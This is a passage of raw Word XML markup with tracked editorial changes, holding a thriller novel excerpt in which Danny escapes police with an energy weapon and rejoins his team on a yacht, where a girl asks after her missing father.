          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">From the ground, sirens and radio chatter </w:t>
      </w:r>
      <w:del w:id="3127" w:author="TextVet" w:date="2016-03-29T13:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A4426">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>could be heard</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3128" w:author="TextVet" w:date="2016-03-29T13:42:00Z">
        <w:r w:rsidR="008A4426">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>were audible</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> even on the rooftop.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noticed the voices of his comrades in the Bluetooth. “Danny! Danny!” Mike hollered. “Can you </w:t>
      </w:r>
      <w:r w:rsidRPr="00924E20">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3129" w:author="TextVet" w:date="2016-03-29T13:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">hear </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>us?</w:t>
      </w:r>
      <w:ins w:id="3130" w:author="TextVet" w:date="2016-03-29T13:42:00Z">
        <w:r w:rsidR="00924E20">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“Yeah,” Danny </w:t>
      </w:r>
      <w:ins w:id="3131" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidR="005D3E1D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>replie</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3132" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D3E1D">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 xml:space="preserve">d, </w:t>
      </w:r>
      <w:del w:id="3133" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D3E1D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>calmly round</w:t>
      </w:r>
      <w:ins w:id="3134" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidR="005D3E1D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3135" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D3E1D">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the </w:t>
      </w:r>
      <w:ins w:id="3136" w:author="TextVet" w:date="2016-03-29T13:44:00Z">
        <w:r w:rsidR="000F48B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">helipad </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>perimeter</w:t>
      </w:r>
      <w:del w:id="3137" w:author="TextVet" w:date="2016-03-29T13:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000F48B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the helipad</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:del w:id="3138" w:author="TextVet" w:date="2016-03-29T13:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D3E1D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">go </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>retrieve his energy rifle.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place is swarming with cops!”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del w:id="3139" w:author="TextVet" w:date="2016-03-29T13:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A3C69">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Yeah, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">I </w:t>
      </w:r>
      <w:ins w:id="3140" w:author="TextVet" w:date="2016-03-29T13:44:00Z">
        <w:r w:rsidR="003A3C69">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>know</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3141" w:author="TextVet" w:date="2016-03-29T13:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A3C69">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>see that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Don’t worry, Mike. I’ll be fine. They’re all talking on radios.” He checked the lights on the HERF gun. It had enough charge left for a dozen more shots.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>30</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With the watchful eyes of his team</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and a few well-timed HERF pulses, Danny managed to </w:t>
      </w:r>
      <w:ins w:id="3142" w:author="TextVet" w:date="2016-03-29T13:46:00Z">
        <w:r w:rsidR="00985586">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>evade</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3143" w:author="TextVet" w:date="2016-03-29T13:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00985586">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>stay out of sight of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the police combing the Gallante. </w:t>
      </w:r>
      <w:ins w:id="3144" w:author="TextVet" w:date="2016-03-29T13:46:00Z">
        <w:r w:rsidR="005F0E95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>After</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3145" w:author="TextVet" w:date="2016-03-29T13:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005F0E95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There were</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a few close calls, </w:t>
      </w:r>
      <w:del w:id="3146" w:author="TextVet" w:date="2016-03-29T13:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005F0E95">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">but </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he slipped out of the building unnoticed.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battery in his cellphone gave out after he left the hotel. In silence and moonlit darkness, Danny cut through the evergreen-fringed backyards of Medina billionaires. He looked out for security cameras and motion-detecting floodlights, zapping them when necessary. After slow, tentative progress across private property, he felt he</w:t>
      </w:r>
      <w:ins w:id="3147" w:author="TextVet" w:date="2016-03-29T13:47:00Z">
        <w:r w:rsidR="00DE4014">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3148" w:author="TextVet" w:date="2016-03-29T13:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DE4014">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d put a comfortable distance between himself and the hotel. He climbed over a retaining wall and arrived at a wide, well-lit road running through downtown Bellevue. There, he pulled off his overalls, leaving himself in a </w:t>
      </w:r>
      <w:ins w:id="3149" w:author="TextVet" w:date="2016-03-29T13:48:00Z">
        <w:r w:rsidR="00CF5804">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3150" w:author="TextVet" w:date="2016-03-29T13:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CF5804">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-shirt and jeans. He stuffed his electrician disguise down a gutter grate.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Then he figured out which direction led toward the Kirkland Marina, slung his HERF gun back over his shoulder, and began walking.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he walked.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walked.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had no idea how much time had passed. He wore no watch, and his dead cellphone wouldn’t tell him the hour. The occasional car zoomed by, paying him no mind. He walked past gas stations, past strip malls, past ghostly-quiet four-way intersections whose stoplight signals changed color for nobody.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heard the hum of an engine slowing down behind him. He turned around.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waved through the windows of Natalie’s car. “Danny!” she </w:t>
      </w:r>
      <w:r w:rsidR="00531F38">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cr</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="00531F38">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r w:rsidR="00531F38">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pull</w:t>
      </w:r>
      <w:r w:rsidR="00531F38">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> up beside him. “God, </w:t>
      </w:r>
      <w:del w:id="3151" w:author="TextVet" w:date="2016-03-29T13:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0022262F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">I’m glad to see you! </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I’ve been looking everywhere. You’re going the wrong way!”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="3152" w:author="TextVet" w:date="2016-03-29T13:51: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climbed into the passenger seat. “My cellphone’s dead. I have no GPS.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D0562D" w:rsidRPr="000D3488" w:rsidRDefault="00D0562D" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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In the cabin of Jason’s yacht,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rosie and Moshen sat </w:t>
      </w:r>
      <w:ins w:id="3153" w:author="TextVet" w:date="2016-03-29T13:52:00Z">
        <w:r w:rsidR="005949F8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>side by side</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3154" w:author="TextVet" w:date="2016-03-29T13:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005949F8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>next to one another</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the leather bench by the lacquered table. They had cleared </w:t>
      </w:r>
      <w:del w:id="3155" w:author="TextVet" w:date="2016-03-29T13:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00955447">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a space among the laptops and electronics, and filled it with markers and pencils and blank pieces of paper from Jason’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dungeons &amp; Dragons</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> kit. Moshen kept the girl distracted by flipping through the illustrated rulebooks and teaching her how to draw pictures of dragons, orcs, and fairies, of knights and priests and wizards. On the screen behind them, the conference call had stayed active, keeping Mike and Natalie telepresent.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All eyes turned towards the cabin stairs as Danny, Tina, and Jason descended from the deck.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Rosie erupted in a joyous, expectant smile. Once the t</w:t>
      </w:r>
      <w:del w:id="3156" w:author="TextVet" w:date="2016-03-29T13:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A69ED">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hree of them</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3157" w:author="TextVet" w:date="2016-03-29T13:54:00Z">
        <w:r w:rsidR="001A69ED">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>rio</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="3158" w:author="TextVet" w:date="2016-03-29T13:53:00Z">
        <w:r w:rsidR="001A69ED">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>descended, her smile lingered briefly, then sank into a perplexed frown.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“Where’s my Dad?” she asked nervously.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face went pale.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w:t>
      </w:r>
      <w:ins w:id="3159" w:author="TextVet" w:date="2016-03-29T13:54:00Z">
        <w:r w:rsidR="0027504E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-wh</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ere’s my Dad!?” she repeated with fierce insistence.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Silent seconds </w:t>
      </w:r>
      <w:del w:id="3160" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00393D9F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>drifted by</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3161" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
        <w:r w:rsidR="00393D9F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ground past</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The child’s face slowly melted into a grimace of agonized horror. </w:t>
      </w:r>
      <w:r w:rsidRPr="00393D9F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3162" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Where’s my Dad?</w:t>
      </w:r>
      <w:ins w:id="3163" w:author="TextVet" w:date="2016-03-29T13:55:00Z">
        <w:r w:rsidR="00393D9F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
